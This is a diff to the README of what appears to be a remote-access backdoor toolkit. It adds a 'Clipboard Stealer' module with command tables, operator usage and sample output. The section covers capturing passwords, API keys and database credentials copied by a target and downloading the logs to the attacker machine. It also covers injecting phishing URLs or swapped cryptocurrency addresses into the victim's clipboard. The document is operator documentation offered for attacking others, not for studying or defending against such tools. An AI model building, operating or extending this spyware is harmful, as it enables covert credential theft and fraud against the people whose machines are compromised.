@@ -83,6 +83,7 @@ pip3 install -r requirements.txt
 - `mss` - For fast screen capture in recordings
 - `imageio` - For video file creation
 - `imageio-ffmpeg` - For ffmpeg codec support
+- `pyperclip` - For clipboard monitoring and manipulation
 
 **Note:** If you're building executables, the `build_executable.py` script will automatically install these requirements for you.
 
@@ -118,6 +119,15 @@ pip3 install Pillow pyautogui    # Screenshots
 pip3 install pyaudio             # Audio recording (requires portaudio system library)
 pip3 install opencv-python numpy mss imageio imageio-ffmpeg  # Screen recording
 pip3 install opencv-python       # Webcam capture
+pip3 install pyperclip           # Clipboard monitoring
+
+# For clipboard on Linux, also install:
+# Ubuntu/Debian:
+sudo apt-get install xclip
+# Fedora/CentOS:
+sudo dnf install xclip
+# Arch Linux:
+sudo pacman -S xclip
 
 # For best screen recording performance, install ffmpeg:
 # macOS:
@@ -363,6 +373,18 @@ Release: 5.15.0
 | `keylog_status` | Check keylogger status | `keylog_status` |
 | `keylog_clear` | Clear keylog file | `keylog_clear` |
 
+**Clipboard Stealer:**
+| Command | Description | Example |
+|---------|-------------|---------|
+| `clipboard_start` | Start monitoring clipboard | `clipboard_start` |
+| `clipboard_stop` | Stop monitoring clipboard | `clipboard_stop` |
+| `clipboard_status` | Check clipboard monitor status | `clipboard_status` |
+| `clipboard_get` | Get current clipboard content | `clipboard_get` |
+| `clipboard_set <text>` | Set clipboard content | `clipboard_set malicious_url` |
+| `clipboard_dump` | Download clipboard log file (auto-saved as clipboard_dump_TIMESTAMP.txt) | `clipboard_dump` |
+| `clipboard_clear` | Clear clipboard logs | `clipboard_clear` |
+| `clipboard_list` | List all clipboard log files | `clipboard_list` |
+
 **Privilege & System:**
 | Command | Description | Example |
 |---------|-------------|---------|
@@ -554,6 +576,210 @@ Deletes the log file and clears the buffer
 - Each `keylog_dump` creates a new file with unique timestamp
 - Old dumps are preserved (not overwritten)
 - Can be analyzed later or transferred securely
+
+#### Clipboard Stealer
+
+The clipboard stealer monitors and captures all text copied to the target's clipboard, providing a powerful way to steal passwords, sensitive data, and other information.
+
+```
+clipboard_start
+```
+
+Response: `[+] Clipboard monitoring started. Logging to: logs/clipboard/clipboard_20251004_150230.txt`
+
+##### How It Works
+
+###### Real-time Monitoring
+
+1. **Background Thread**: Runs continuously checking clipboard every 1 second
+2. **Change Detection**: Compares current clipboard with last known content
+3. **Automatic Logging**: When clipboard changes, logs timestamp and full content
+4. **Non-blocking**: Doesn't interfere with backdoor operations
+
+###### What Gets Captured
+
+- Passwords copied from password managers
+- Text copied from documents
+- URLs copied from browsers
+- Email addresses and usernames
+- API keys and tokens
+- Database credentials
+- SSH keys
+- Any text content copied by the user
+
+##### Check Status
+
+```
+clipboard_status
+```
+
+Shows:
+
+```json
+{
+  "running": true,
+  "log_file": "logs/clipboard/clipboard_20251004_150230.txt",
+  "check_interval": 1,
+  "pyperclip_available": true,
+  "last_content_length": 256,
+  "log_size_bytes": 2048
+}
+```
+
+##### Get Current Clipboard
+
+```
+clipboard_get
+```
+
+**Response:**
+
+```
+[+] Latest clipboard content (42 chars):
+This is some sensitive text from clipboard
+```
+
+This retrieves the current clipboard content without starting the monitor. Useful for:
+
+- Quick clipboard checks
+- Verifying what's currently copied
+- Testing clipboard access
+
+##### Set Clipboard (Injection Attack)
+
+```
+clipboard_set https://fake-login-page.com
+```
+
+**Response:**
+
+```
+[+] Clipboard set to: https://fake-login-page.com
+```
+
+**Attack Scenarios:**
+
+- Replace legitimate URLs with phishing links
+- Inject malicious commands the user might paste
+- Replace cryptocurrency addresses
+- Social engineering attacks
+
+**Example:**
+
+```
+# User copies: https://bank.com/login
+# You inject:
+clipboard_set https://fake-bank.com/phishing
+
+# When user pastes, they paste YOUR URL instead
+```
+
+##### View and Download Captured Clipboard Data
+
+```
+clipboard_dump
+```
+
+**What happens:**
+
+1. Retrieves the current clipboard log file from target
+2. Automatically downloads to attacker machine
+3. Saves as `clipboard_dump_YYYYMMDD_HHMMSS.txt` with timestamp
+4. Displays the content in the terminal
+
+**Output example:**
+
+```
+Clipboard log file ready: logs/clipboard/clipboard_20251004_150230.txt
+[*] Downloading clipboard log file...
+[+] Clipboard log file downloaded: clipboard_dump_20251004_150530.txt
+
+=== Clipboard Log Content ===
+============================================================
+Timestamp: 2024-10-04 15:03:45
+Length: 42 characters
+------------------------------------------------------------
+admin@company.com
+============================================================
+
+============================================================
+Timestamp: 2024-10-04 15:04:12
+Length: 23 characters
+------------------------------------------------------------
+MySecretPassword123!
+============================================================
+
+============================================================
+Timestamp: 2024-10-04 15:05:30
+Length: 256 characters
+------------------------------------------------------------
+Server: production-db.company.local
+Username: db_admin
+Password: Str0ngP@ssw0rd2024
+Port: 5432
+Database: production_data
+============================================================
+=== End of Clipboard Log ===
+```
+
+##### Stop Clipboard Monitoring
+
+```
+clipboard_stop
+```
+
+Response: `[+] Clipboard monitoring stopped`
+
+##### Clear Logs
+
+```
+clipboard_clear
+```
+
+Response: `[+] Clipboard logs cleared. New log file: logs/clipboard/clipboard_20251004_151045.txt`
+
+Deletes the current log file and creates a new empty one.
+
+##### List All Log Files
+
+```
+clipboard_list
+```
+
+Response:
+
+```
+[+] Clipboard log files:
+  - clipboard_20251004_150230.txt (2048 bytes)
+  - clipboard_20251004_145612.txt (1024 bytes)
+  - clipboard_20251004_143305.txt (512 bytes)
+```
+
+##### Platform Requirements
+
+**macOS:** Works natively (uses pbcopy/pbpaste)
+
+**Windows:** Works natively (pyperclip uses win32clipboard)
+
+**Linux:** Requires xclip or xsel
+
+```bash
+# Install on Ubuntu/Debian
+sudo apt-get install xclip
+
+# Install on Fedora/CentOS
+sudo dnf install xclip
+
+# Install on Arch
+sudo pacman -S xclip
+```
+
+##### Limitations
+
+1. **Text Only**: Only captures text content, not images or files
+2. **Timing**: May miss very rapid clipboard changes (< 1 second apart)
+3. **Platform**: Linux requires xclip/xsel installation
+4. **Detection**: Can be detected by security tools monitoring clipboard
 
 #### Test Privilege Escalation
 
@@ -1217,6 +1443,53 @@ python3 test_screen_recording.py quick
 # "Recording failed - ffmpeg may not be installed" -> Install ffmpeg (see above)
 ```
 
+### Issue 9: Clipboard Monitoring Not Working
+
+```bash
+# Install pyperclip
+pip3 install pyperclip
+
+# For Linux - install xclip or xsel:
+# Ubuntu/Debian:
+sudo apt-get update
+sudo apt-get install -y xclip
+
+# Alternative - install xsel instead:
+sudo apt-get install -y xsel
+
+# Fedora/CentOS/RHEL:
+sudo dnf install -y xclip
+
+# Arch Linux:
+sudo pacman -S xclip
+
+# Test clipboard access:
+python3 -c "import pyperclip; pyperclip.copy('test'); print(pyperclip.paste())"
+
+# If you get "Pyperclip could not find a copy/paste mechanism":
+# On Linux, ensure xclip or xsel is installed and in PATH
+which xclip  # Should show path to xclip
+which xsel   # Or path to xsel
+
+# macOS and Windows: No additional dependencies needed
+# pyperclip works natively
+
+# Common error messages:
+# "Clipboard monitoring requires pyperclip" -> pip3 install pyperclip
+# "Pyperclip could not find a copy/paste mechanism" -> Install xclip (Linux)
+# "clipboard_start returns feature not available" -> Check if pyperclip is installed
+
+# Verify clipboard stealer works:
+clipboard_start
+clipboard_get
+clipboard_set "test content"
+clipboard_status
+clipboard_stop
+
+# For detailed troubleshooting, see:
+# CLIPBOARD_QUICKSTART.md and CLIPBOARD_GUIDE.md
+```
+
 ## 📊 Testing Checklist
 
 - [ ] Attacker listener starts successfully
@@ -1226,6 +1499,11 @@ python3 test_screen_recording.py quick
 - [ ] File download works
 - [ ] File upload works
 - [ ] Keylogger starts and captures keystrokes
+- [ ] Keylogger dump downloads automatically
+- [ ] Clipboard monitoring starts successfully
+- [ ] Clipboard captures copied text
+- [ ] Clipboard dump downloads automatically
+- [ ] Clipboard injection works
 - [ ] Privilege escalation enumeration works
 - [ ] Screenshot capture works
 - [ ] Screen recording works (timed and background)
